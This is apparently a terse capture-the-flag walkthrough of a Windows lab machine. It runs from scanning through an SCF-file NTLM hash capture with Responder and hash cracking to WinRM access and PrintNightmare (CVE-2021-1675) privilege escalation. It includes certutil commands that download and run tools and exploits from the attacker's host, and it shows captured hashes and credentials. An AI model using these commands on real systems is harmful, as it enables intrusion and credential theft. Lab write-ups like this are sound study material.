# scanning
* `TCP` Scan
TARGET=10.10.11.106 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Ncat: Connected to 10.10.11.106:80.
Ncat: Connected to 10.10.11.106:135.
Ncat: Connected to 10.10.11.106:445.
Ncat: Connected to 10.10.11.106:5985.


> enum4linux 10.10.11.106
```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec 20 14:58:14 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.11.106
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.11.106    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.11.106    |
 ============================================ 
Looking up status of 10.10.11.106
No reply from 10.10.11.106

 ===================================== 
|    Session Check on 10.10.11.106    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

> dirsearch -u http://10.10.11.106 -e php,html,txt -w /usr/share/wordlists/dirb/common.txt -f --auth=YWRtaW46YWRtaW4=
```
[15:04:57] 403 -    1KB - /images/
[15:04:57] 301 -  150B  - /images  ->  http://10.10.11.106/images/
[15:04:57] 403 -    1KB - /Images/
[15:04:57] 301 -  150B  - /Images  ->  http://10.10.11.106/Images/
[15:04:57] 401 -   20B  - /index.php
[15:04:57] 401 -   20B  - /Index.php
[15:04:57] 401 -   20B  - /index.php/
```

admin:admin
MFP Firmware Update Center

> ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]'
```
interface: tun0 (10.10.x.0/255.255.254.0)
filter: (ip || ip6)
match: s.?a.?m.?b.?a.*[[:digit:]]
#####
T 10.10.x.x:44644 -> 10.10.11.106:445 [AP] #5
  .....SMBr.....C.........................MICROSOFT NETWORKS 3.0..LANMAN1.0..LM1.2X002..DOS LANMAN2.1..LANMAN2.1..Samba..NT LANMAN 1.0..NT LM 0.12..SMB 2
  .002..SMB 2.???.                                                                                                                                       
#################

```

## Gather ntlm hash using Share Command File
* https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
* shell.scf
```
[Shell]
Command=2
IconFile=\\10.10.14.18\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

> responder -wrf --lm -v -I tun0
```
tony::DRIVER:cc20ff5dd7ed0251:8D219FD8F452FC5482AD4EE21F5AD7FF:010100000000000073AEF27A84F5D70161FB9032F8FE96120000000002000400270027000000000000000000
```

> hashcat64.exe -m 5600 hash.txt rockyou.txt
`liltony`

> evil-winrm -i 10.10.11.106 -u tony -p liltony

# user.txt

# pe
> C:\Users\tony\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

certutil.exe -urlcache -f http://10.10.x.x/pea.exe pea.exe

> pea.exe
C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

[+] Scheduled Applications --Non Microsoft--
   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (DRIVER\Administrator) VerifyFirmware: C:\Users\tony\appdata\local\job\job.bat 
    Permissions file: tony [AllAccess]
    Permissions folder(DLL Hijacking): tony [AllAccess]
    Trigger: At log on of DRIVER\tony

[+] Searching hidden files or folders in C:\Users home (can be slow)
     C:\Users\tony\AppData\Local\Packages\Windows.PurchaseDialog_cw5n1h2txyewy\Windows.PurchaseDialog_6.2.0.0_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG2
     C:\Users\tony\AppData\Local\Packages\Windows.PurchaseDialog_cw5n1h2txyewy\Windows.PurchaseDialog_6.2.0.0_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG1
     C:\Users\tony\AppData\Local\Packages\Windows.ContactSupport_cw5n1h2txyewy\Windows.ContactSupport_10.0.10240.16384_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG2
     C:\Users\tony\AppData\Local\Packages\Windows.ContactSupport_cw5n1h2txyewy\Windows.ContactSupport_10.0.10240.16384_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG1
     C:\Users\tony\ntuser.pol
     C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\do_not_delete_folders
     C:\Users\All Users\ntuser.pol
     C:\Users\All Users\RICOH_DRV

> get-process

Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
-------  ------    -----      ----- -----   ------     -- -----------
     40       4     2156       1604 ...67    47.31   2848 cmd
    113      10    11072       7244 ...46    85.06   2396 conhost
    321      14     1164       4184 ...03             344 csrss
    265      18     1180       4084 ...08             460 csrss
    205      13     3344      12044 ...02            2336 dllhost
    271      24    32832      52288 ...03             812 dwm
    509      27     8608      30816 ...32     0.66   1852 explorer
   1432      61    17864      63288 ...74   650.61   2792 explorer
    538      35    10092      35248 ...45     0.53   3312 explorer
    528      27     8632      30908 ...33     0.64   3328 explorer
      0       0        0          4     0               0 Idle
    962      24     5120      14772 ...02             576 lsass
    173      13     2328       8864 ...95            3052 msdtc
    470      38    16616      44500   302    15.86   4912 OneDrive
    114      14     6288      13076 ...82            2712 php-cgi
    114      14     6240      12920 ...82            4360 php-cgi
     55       6      728       3324 ...65     0.02   3680 PING
    306      19     6720      23524 ...81     2.47   3164 RuntimeBroker
    694      45    23460      28012 ...33            2584 SearchIndexer
    753      47    29452      70764 33073     1.23   3780 SearchUI
    181      12     2784      10644 ...02            1960 sedsvc
    246      10     2676       6468 ...74             568 services
    641      31    13992      46536   252     1.13   3536 ShellExperienceHost
    361      16     3804      18304 ...49     1.91   2816 sihost
     49       3      340       1180 ...56             268 smss
    381      22     5320      14044 ...13            1160 `spoolsv`
    172      12     2088      12312 ...26     0.06    596 svchost
    540      21     5364      17260 ...21             656 svchost
    518      17     3404       8984 ...91             712 svchost
   1313      53    15608      37920 ...24             820 svchost
    565      26    11664      18676 ...36             880 svchost
    207      16     1972       8288 ...96             904 svchost
    423      21     4868      17760 ...47             932 svchost
    770      27     6124      14172 ...40            1012 svchost
    638      46     7760      20400 ...24            1080 svchost
    487      42    13632      24432 ...64            1304 svchost
    312      20     5488      19548 ...17            1516 svchost
    126      11     2996       9236 ...96            1572 svchost
    189      21     3780      15444 ...61            1608 svchost
    185      15     3424       9916 ...04            1736 svchost
    116       9     1276       6160 ...77            2156 svchost
    101       7     1268       6016 ...89            4304 svchost
    871       0      120        140     3               4 System
    275      27     4568      13800 ...17     7.20   2856 taskhostw
    138      11     2656      10416 ...22            1636 VGAuthService
    108       7     1312       5516 ...06            1648 vm3dservice
    100       8     1372       6024 ...28            2032 vm3dservice
    333      23    10060      22240 ...56            1656 vmtoolsd
    211      18     5008      15200 ...67     4.84   4812 vmtoolsd
    240      23     5976      13864 ...14            4608 w3wp
     87       9      984       4724 ...74             452 wininit
    181       9     1820       8720 ...22             504 winlogon
    328      19     9976      19692 ...98            2456 WmiPrvSE
    798      34    71108     101756 ...80     8.00   2180 wsmprovhost
    219      10     1532       7152 ...92             348 WUDFHost

## CVE-2021-1675
* https://github.com/calebstewart/CVE-2021-1675
> certutil.exe -urlcache -f http://10.10.x.x/cve.ps1 cve.ps1
Import-Module .\cve.ps1
Invoke-Nightmare

> powershell -ExecutionPolicy Bypass -command "& { . .\cve.ps1; Invoke-Nightmare }"
```
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

> evil-winrm -i 10.10.11.106 -u adm1n -p P@ssw0rd


# root

# ref
https://zhuanlan.zhihu.com/p/438040496